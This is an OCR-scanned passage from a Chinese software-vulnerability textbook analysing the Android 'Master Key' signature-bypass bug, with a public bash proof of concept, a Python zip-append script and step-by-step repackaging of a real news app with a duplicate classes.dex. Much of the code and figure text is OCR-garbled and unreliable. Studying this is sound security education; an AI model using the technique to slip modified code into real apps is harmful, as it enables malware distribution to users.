---
## Page 524
第10章Android平台漏润分析505
下面从Android源码层分析其签名验证的原理，对应的源码位于：http://osxr.organdroid/source/
libcore/luni/src/main/java/java/util/jar/JarVerifier.java。
（1）读取DSA/RSA/EC后级的签名证书文件，然后调用verifyCertificate进行验证，此处并无限
制文件名，因此将CERT.RSA改成CERTI23.RSA依然有效，但SF文件得跟RSA文件等签名证书文件
同名，如图10-51所示。
255
ertifieates()（
266
i
return false;
reture trve;
272
图10-51readCertificates函数
（2）读取SF（与后面证书同名）与RSA/DSA/EC文件的内容，再调用verifySignature进行校验，
如图10-52所示。
279
prilvata pod vstcaptifleate(striag cerl
2
piuis
用
图10-52verifySignature函数
（3）在调用verifySignature函数（点击该函数可直接帮助索引，它位于http://osxr.org/android/
source/libcore/luni/src/main/java/org/apache/harmony/security/utils/JarUtils.java）进行校验时会读取各项
证书信息，包括证书序列号、拥有者、加密算法等，然后判断CERT.RSA证书对CERT.SF的文件签名
是否正确，防止CERT.SF被纂改，若成功则返回证书链，否则抛出异常，如图10-53和图10-54所示。
---
## Page 525
506漏洞战争：软件漏洞分析精要
169
sig.initvecify(cecte[isevecbectTodex]):
79
eityxeept
tise(*so many Messapeoigeat attribetes°)1
t,r91set2srt :
图10-53调用verifySignature函数校验证书信息
ageoigeet,getisatacedaoid)
(efaytesi)
nesrs erutaCaia(certa{ianutertisaex], terta]r
227
（4）在返回证书链时，对于自签名证书，直接作为合法证书返回，如图10-55所示。正是由于
Android允许自签名才导致很多重打包引发的安全问题，特别是许多恶意软件经常通过重打包的方式
将恶意代码插入流行软件中，再放到各个Android市场供用户下载。
（5）继续回到verifyCertificate函数，它会校验SF文件中的MANIFEST.MF中各项Hash值是否正
确，防止MF文件被幕改，如图10-56和图10-57所示。
---
## Page 526
第10章Android平台漏润分析507
(trse)(
L
(31)(
(X589C
图10-55
支持自签名证书
atedy+ att
reedy
00/'):
s1°) 1= =1
triluter"
atrg grtley0);
tlipatwdlaetrs grtley0, ju
i3e, n10:
图10-56
校验SF文件中的MANIFEST.MF中各项Hash值是否正确
---
## Page 527
508漏洞战争：软件漏洞分析精要
305
tes.gta
tar
0igest ad;
e)egor
399
te(data, start, ed - start)
416
图10-57
verify函数
（6）对于非系统应用，枚举除META-INF目录以外的所有文件，然后进行哈希运算，并将其与
MANIFEST.MF中的各文件哈希值进行比对，只有相匹配后才允许安装应用，如图10-58~图10-60所示。
903
615
Certitieate[1 certs * ssl])
27
30
.633
图10-58
CollectCertificates函数
154
Eiaal 5tring nase = je-getSsme(1:
tiaal_Certiticate[1 1ocalCerts + laedCertifieetee(jarPile,_Js,_readleffee))]
图10-59枚举除META-INF目录以外的所有文件，然后进行哈希运算
---
## Page 528
第10章Android平台漏洞分析509
gthj +*) (
105
图10-60各文件哈希必须与MANIFEST.MF中的各文件哈希值匹配才允许安装
总结，在Android应用签名验证过程中，满足以下条件才能安装应用。
（1）SHA-1（除META-INF目录外的文件）=MANIFEST.MF 中的各SHA-1值。
（2）（SHA-1+Base64）（MANIFEST.MF文件及各子项）=CERT.SF中各值。
（3）公钥（CERT.SF）=CERT.RSA/DSA对SF文件的签名。
以网易新闻应用为例，如果读者直接将修改后的classes.dex替换原classes.dex，那么在安装时会
提示验证失败，无法安装应用（如图10-61所示），但是利用本节的签名漏洞可以绕过此限制。
fdete
killioy
mixki11e et.2 &itf
C5161719 1yte
图10-61签名验证失败
10.5.3
漏洞重现
此处漏洞测试的环境如表10-1所示。
表10-1测试环境
推荐使用的环境
备注
操作系统
Windows 7
简体中文版
手机系统
HTC G14
版本号：Android 4.0.1
反编译器
Android Killer
版本号：1.2.0.0正式版
我们先看看外面公开的利用代码，其原理就是在原APK包中放置两个同名的classes.dex，其中一
个是被修改的：
---
## Page 529
510漏洞战争：软件漏洞分析精要
#1/bin/bash
#PoC for Android bug 8219321 by @pof
#+info:https://jira.cyanogenmod.org/browse/CYAN-16e2
1f [ -z $1 ]; then echo “Usage: $θ * ; exit 1 ; f1
APK=$1
rm -r out out.apk tmp 2>/dev/nu11
java -jar apktool.jar d $APK out
#apktool d $APK out
no p3
bash
. p3
java -jar apktool.jar b out out.apk
#apktool b out out.apk
xa, adk auop uau auop xdeno, ouoa#
#bash
mkdir tmp
mkdir tmp/orgin
mkdir tnp/dirty
/dup3
unzip../$APK
unzip../out.apk-d./dirty
mv classes.dex ./orgin
cat >poc·py <<-EOF
#1/usr/bin/python
1mport sys
import zipfile
z = zipfile.ZipFile(sys.argv[1], "a")
z.write(sys.argv[2])
z.close()
EOF
chmod 755 poc.py
for f in find . -type f |egrep -v "(poc.pylout.apk|dirty/lorgin/); do ./poc.py out.apk
"sf"; done
cp./dirty/classes.dex./
./poc.py out.apk classes.dex
rm classes.dex
cp -/orgin/classes.dex ./
---
## Page 530
第10章Android平台漏润分析511
/poc.py out.apk classes.dex
cp out,apk ../evi1-$APK
cd ..
no du - u
echo “Modif1ed APK: ev11-SAPK"
上述代码依赖其他工具和系统环境，不是很稳定，面且即使运行成功，也依然会发生如图10-61
所示的错误，因为这里忽略了一处重要问题：APK包中两个classes.dex的先后顺序，正是基于此才导
致许多朋友测试失败的.该问题可通过先将恶意classes.dex放入APK包中，再将正常classes.dex放入
APK包得到解决
为了提高稳定性，笔者专门提取了上面shell脚本中的poc.py，其文件内容如下：
#1/usr/bin/python
import zipf1le
import sys
z = zipfile.ZipFile(sys.argv[1], “a")
z.write(sys.argv[2])
z.close()
使用该poc.py即可将同名文件打包入APK包里。以网易新闻为例，先提取里面正常的classes.dex，
重命名为org.classes.dex，然后删除APK包中的classes.dex，如图10-62所示。
rPO
Erter
建口用)
n8t)
Shhibrter
CwhenAd
4
BeNM
2
EORM
添
Del
F6
N etsets
META-IN
rg
An
建交用央
Dsl=N
图10-62删除APK包中的原classes.dex
接下来备份修改的classes.dex，笔者在其中添加了一个toast提示框，提示内容为“HackedBy
riusksk”，可以直接借助AndroidKiller反编译工具修改，先用它反编译网易新闻，找到入口Activity
为com.netease.nr.biz.ad.AdActivity，如图10-63所示。
---
## Page 531
512漏洞战争：软件漏洞分析精要
A
图10-63网易新闻的入口Activity
双击左侧栏的AdActivitysmali查看对应的smali代码，找到onCreate函数，右击选择“插入代码”
“toast输出”（如图10-64所示）就会自动生成相应的smali代码（如图10-65所示），这也是Android
Killer工具相对其他Android逆向工具的一大优势。
-
BR
图10-64选择插入代码的功能
---
## Page 532
第10章Android平台漏洞分析513
图10-65自动生成smali代码
然后按“Ctrl+S”组合键保存代码，如果不保存的
TA
话，直接按编译是不会编译添加的代码的，保存后按左上
角的编译按钮（如图10-66所示），编译过程及生成的APK
路径都会在“日志输出”窗口里输出，如图10-67所示生
AK工程
成newrecader_killer.apk，直接提取里而的classes.dex，重命
名为evil.classes.dex，即是我们需要的恶意dex文件。
图10-66编译当前APK工程
/
行签名.等..
图10-67编译日志
接下来，把evil.classes.dex、org.class
sses.dex、poc.py和删除dex的newreader.apk放置在同一个目录
下，然后执行如图10-68所示的命令。
图10-68打包同名dex文件入APK
---
## Page 533
514漏润战争：软件漏洞分析精要
最后，生成包含两个同名classes.dex的APK包，如图10-69所示。
C
+
区 CA
apk)
大小
88 115
412075
297.861
290 467
31 796
92 996
2913-07-49 21.28
29662
1166
2013-47 49 2128
2013-07-49 2128
意文件
4905-412
4 345 346
2013-07-09 2128
2 695 64)
17 348
2 695 646
3 626
2013-06-28 1665
Mdts.
2 690 229
2 699 229
S591 01-(0-5102
2015-47-30 17.40
正常文件
441 916
71 878 2013-06-28 1605
图10-69包含两个同名classes.dex的APK包
笔者在HTCG14（Android4.0.1）实体机上成功安装修改后的APK，打开网易新闻后成功弹出我
们前面插入的toast消息，如图10-70所示。
图10-70成功执行插入的代码
10.5.4漏洞原理分析
Android系统在进行签名校验前会先进行zip解压缩（即解析APK包），但如果此时包含两个同名
同路径的文件（zip压缩包中每个文件或者目录均对应一个Entry，这些共同组成Entry链表），比如两
个classes.dex，解压缩时后者会覆盖前者，如图10-71所示。因此必须前者为恶意dex文件，后者为正
常dex文件，才能绕过签名验证，这就是为什么要注意两个classes.dex先后顺序的根本原因。
---
## Page 534
第10章Android平台润润分析515
国
恶意文
性被替换为正常文生